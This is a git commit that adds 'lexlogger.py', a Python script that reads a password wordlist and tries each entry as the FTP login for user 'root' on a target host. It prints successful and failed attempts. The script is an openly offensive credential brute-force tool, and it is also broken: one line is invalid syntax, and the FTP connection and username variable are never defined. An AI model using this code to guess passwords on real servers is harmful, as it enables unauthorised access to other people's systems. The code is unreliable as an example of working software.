ac9e792c8d5347db1a94db1317b7f2ba97029e15
gho5t-byte88 <79258436+Gho5t-byte@users.noreply.github.com>
2021-08-16 19:53:36 +0200

    Add files via upload

---
+++ lexlogger.py
@@ -0,0 +1,44 @@
+#!/usr/bin/python
+import ftplib
+import sys
+import optparse
+ 
+def standardlog():
+   try:
+       direc = ftp.nlst()
+   except:
+       direc = []
+       print("[*] could not get dir content")
+       return 
+   retList = []
+   for FileName in direc:
+      fn = FileName.lower()
+      retList.append(fn)
+   return retList      
+def brutelogPass(host,lista):
+   lt = open(lista, 'r')
+   motho = lt
+   found = 0
+   ValidCreds = []
+   global fdd = "greedy"
+   count = 0
+   for ln in motho.readlines():
+   
+      try:          
+          ftp.login(root,ln)
+          print("[*] login success"+str(ln))
+          found = 1
+          ValidCreds.append(ln)
+          count += 1
+      except:
+          print("[*]login fail...."+" "+str(ln)) 
+          found = 0
+               
+   return found                      
+lista = sys.argv[1]
+host = sys.argv[2]
+brutelogPass(host,lista)
+aaa = brutelogPass(host,lista)
+print(fdd)
+if (aaa == 1):
+  print("motho")
